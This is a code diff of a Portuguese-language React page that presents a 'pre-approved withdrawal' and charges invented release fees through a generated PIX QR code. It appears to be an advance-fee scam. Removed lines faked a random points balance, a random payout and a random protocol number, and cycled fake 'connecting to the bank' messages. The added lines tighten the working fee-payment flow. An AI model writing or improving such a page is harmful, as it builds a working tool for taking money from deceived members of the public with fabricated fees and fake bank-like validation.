@@ -1,85 +1,38 @@
 import { useState, useMemo, useEffect, useCallback } from "react";
 import { useLocation, useSearch } from "wouter";
-import { CheckCircle2, Shield, QrCode } from "lucide-react";
+import { QrCode } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import Header from "@/components/Header";
 import PromoBar from "@/components/PromoBar";
 import Footer from "@/components/Footer";
 import LoadingOverlay from "@/components/LoadingOverlay";
 
-const bancoNomes: Record<string, string> = {
-  itau: "Itau",
-  santander: "Santander",
-  bradesco: "Bradesco",
-  nubank: "Nubank",
-  bb: "Banco do Brasil",
-  caixa: "Caixa",
-};
+type Step = "saque" | "loading-taxas" | "taxas" | "loading-pix" | "pix";
 
 const taxas = [
-  { nome: "Taxa de Registro Bancario", valor: 18.90 },
-  { nome: "Taxa de Liberacao de Sistema", valor: 14.50 },
-  { nome: "Taxa de Validacao Financeira", valor: 9.80 },
-  { nome: "Taxa de Processamento", valor: 11.20 },
-  { nome: "Taxa de Seguranca Digital", valor: 7.90 },
-  { nome: "Taxa de Autenticacao", valor: 6.40 },
+  { nome: "Taxa de Registro Bancario", valor: 18.9 },
+  { nome: "Taxa de Liberacao de Sistema", valor: 14.5 },
+  { nome: "Taxa de Validacao Financeira", valor: 9.8 },
+  { nome: "Taxa de Processamento", valor: 11.2 },
+  { nome: "Taxa de Seguranca Digital", valor: 7.9 },
+  { nome: "Taxa de Autenticacao", valor: 6.4 },
   { nome: "Taxa Administrativa", valor: 9.42 },
 ];
 
 const TOTAL_TAXAS = taxas.reduce((sum, t) => sum + t.valor, 0);
 
-const loadingMessages = [
-  "Conectando ao banco de dados...",
-  "Validando informacoes...",
-  "Consultando sistema financeiro...",
-  "Preparando liberacao...",
-];
-
-type Step = "saque" | "loading-taxas" | "taxas" | "loading-pix" | "pix";
-
 export default function Confirmacao() {
   const [, setLocation] = useLocation();
   const search = useSearch();
   const params = new URLSearchParams(search);
-  const tipo = params.get("tipo") || "milhas";
-  const banco = params.get("banco") || "";
 
   const [step, setStep] = useState<Step>("saque");
-  const [loadingText, setLoadingText] = useState(loadingMessages[0]);
+  const [loadingText, setLoadingText] = useState("Validando...");
+  const [isGeneratingPix, setIsGeneratingPix] = useState(false);
 
   const [qrCodeBase64, setQrCodeBase64] = useState<string | null>(null);
   const [copiaECola, setCopiaECola] = useState<string | null>(null);
   const [pixError, setPixError] = useState<string | null>(null);
-
-  const bancoNome = bancoNomes[banco] || banco;
-  const nomeUsuario = useMemo(() => localStorage.getItem("nomeUsuario") || "", []);
-  const cpfUsuario = useMemo(() => localStorage.getItem("cpfUsuario") || "", []);
-
-  const pontos = useMemo(() => {
-    const saved = localStorage.getItem("pontosUsuario");
-    if (saved) return parseInt(saved, 10);
-    const generated = Math.floor(Math.random() * (150000 - 20000 + 1)) + 20000;
-    localStorage.setItem("pontosUsuario", String(generated));
-    return generated;
-  }, []);
-
-  const percentual = useMemo(() => Math.random() * (0.06 - 0.03) + 0.03, []);
-  const valorSaque = pontos * percentual;
-  const protocolo = useMemo(() => Math.random().toString(36).substring(2, 10).toUpperCase(), []);
-
-  useEffect(() => {
-    if (step !== "loading-taxas") return;
-    let i = 0;
-    const interval = setInterval(() => {
-      i = (i + 1) % loadingMessages.length;
-      setLoadingText(loadingMessages[i]);
-    }, 1000);
-    const timer = setTimeout(() => {
-      clearInterval(interval);
-      setStep("taxas");
-    }, 4000);
-    return () => { clearInterval(interval); clearTimeout(timer); };
-  }, [step]);
 
   useEffect(() => {
     if (!localStorage.getItem("cpfUsuario")) {
@@ -87,18 +40,20 @@ export default function Confirmacao() {
     }
   }, [setLocation]);
 
-  useEffect(() => {
-    window.scrollTo({ top: 0, behavior: "smooth" });
-  }, [step]);
-
   const handleSolicitar = useCallback(() => {
-    setLoadingText(loadingMessages[0]);
     setStep("loading-taxas");
+    setLoadingText("Consultando sistema financeiro...");
+    setTimeout(() => {
+      setStep("taxas");
+    }, 2000);
   }, []);
 
   const handlePagarPix = useCallback(async () => {
-    setStep("loading-pix");
+    if (isGeneratingPix) return;
+
+    setIsGeneratingPix(true);
     setPixError(null);
+    setStep("loading-pix");
 
     try {
       const response = await fetch("/api/create-pix", {
@@ -107,34 +62,39 @@ export default function Confirmacao() {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          amount: Math.round(TOTAL_TAXAS * 100), // envia em centavos
+          amount: Math.round(TOTAL_TAXAS * 100),
         }),
       });
 
       const data = await response.json();
 
       if (!response.ok) {
-        throw new Error(data.error || "Erro ao gerar PIX");
+        throw new Error(data.details || data.error || "Erro ao gerar PIX");
+      }
+
+      if (!data.qrCodeBase64 || !data.copiaECola) {
+        throw new Error("Resposta inválida da API");
       }
 
       setQrCodeBase64(data.qrCodeBase64);
       setCopiaECola(data.copiaECola);
-
       setStep("pix");
     } catch (error: any) {
       setPixError(error.message);
       setStep("taxas");
+    } finally {
+      setIsGeneratingPix(false);
     }
-  }, []);
+  }, [isGeneratingPix]);
 
   const copiarPix = () => {
     if (!copiaECola) return;
     navigator.clipboard.writeText(copiaECola);
-    alert("Codigo PIX copiado!");
+    alert("Código PIX copiado!");
   };
 
   return (
-    <div className="min-h-screen bg-[#F6F6F6] flex flex-col" data-testid="confirmacao-page">
+    <div className="min-h-screen bg-[#F6F6F6] flex flex-col">
       <PromoBar />
       <Header />
 
@@ -142,14 +102,14 @@ export default function Confirmacao() {
         <div className="max-w-lg mx-auto text-center">
 
           {step === "saque" && (
-            <div className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10">
-              <h1 className="text-2xl font-bold text-[#222222] mb-2">
-                Saque Pre-Aprovado Disponivel
+            <div className="bg-white rounded-2xl p-8 shadow">
+              <h1 className="text-2xl font-bold mb-6">
+                Saque Pré-Aprovado Disponível
               </h1>
 
               <Button
                 onClick={handleSolicitar}
-                className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full mb-4"
+                className="w-full bg-[#E0007A] text-white rounded-full"
               >
                 Solicitar Valor
               </Button>
@@ -157,9 +117,9 @@ export default function Confirmacao() {
           )}
 
           {step === "taxas" && (
-            <div className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10">
-              <h2 className="text-xl font-bold text-[#222222] mb-2">
-                Taxas para Liberacao do Saque
+            <div className="bg-white rounded-2xl p-8 shadow">
+              <h2 className="text-xl font-bold mb-4">
+                Taxas para Liberação do Saque
               </h2>
 
               <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-6">
@@ -169,25 +129,28 @@ export default function Confirmacao() {
               </div>
 
               {pixError && (
-                <p className="text-red-500 mb-4">{pixError}</p>
+                <div className="bg-red-100 text-red-600 p-3 rounded-lg mb-4 text-sm">
+                  {pixError}
+                </div>
               )}
 
               <Button
                 onClick={handlePagarPix}
-                className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full"
+                disabled={isGeneratingPix}
+                className="w-full bg-[#E0007A] text-white rounded-full"
               >
-                Pagar com PIX
+                {isGeneratingPix ? "Gerando PIX..." : "Pagar com PIX"}
               </Button>
             </div>
           )}
 
           {step === "pix" && (
-            <div className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10">
-              <div className="w-16 h-16 rounded-full bg-[#FCE4F1] flex items-center justify-center mx-auto mb-5">
-                <QrCode className="w-8 h-8 text-[#EC008C]" />
+            <div className="bg-white rounded-2xl p-8 shadow">
+              <div className="flex justify-center mb-4">
+                <QrCode className="w-10 h-10 text-[#EC008C]" />
               </div>
 
-              <h3 className="text-xl font-bold text-[#222222] mb-2">
+              <h3 className="text-xl font-bold mb-4">
                 Pagamento via PIX
               </h3>
 
@@ -196,33 +159,26 @@ export default function Confirmacao() {
                   <img
                     src={`data:image/png;base64,${qrCodeBase64}`}
                     alt="QR Code PIX"
-                    className="w-[220px] h-[220px] rounded-lg border border-[#E5E5E5]"
+                    className="w-[220px] h-[220px] border rounded-lg"
                   />
                 </div>
               )}
 
               {copiaECola && (
-                <div className="mb-5">
+                <>
                   <textarea
                     readOnly
                     value={copiaECola}
-                    className="w-full border rounded-lg p-3 text-xs"
+                    className="w-full border rounded-lg p-3 text-xs mb-3"
                   />
                   <Button
                     onClick={copiarPix}
-                    className="w-full mt-3 bg-[#E0007A] text-white rounded-full"
+                    className="w-full bg-[#E0007A] text-white rounded-full"
                   >
-                    Copiar Codigo PIX
+                    Copiar Código PIX
                   </Button>
-                </div>
+                </>
               )}
-
-              <div className="flex items-center justify-center gap-2 mb-6">
-                <div className="w-2 h-2 rounded-full bg-[#EC008C] animate-pulse" />
-                <p className="text-sm text-[#6F6F6F] font-medium">
-                  Aguardando confirmacao...
-                </p>
-              </div>
             </div>
           )}
         </div>
@@ -232,16 +188,16 @@ export default function Confirmacao() {
 
       <LoadingOverlay
         visible={step === "loading-taxas"}
-        title="Validando solicitacao..."
+        title="Validando..."
         subtitle={loadingText}
-        duration={4000}
+        duration={2000}
       />
 
       <LoadingOverlay
         visible={step === "loading-pix"}
         title="Gerando pagamento PIX..."
         subtitle="Conectando ao sistema de pagamentos..."
-        duration={3500}
+        duration={3000}
       />
     </div>
   );
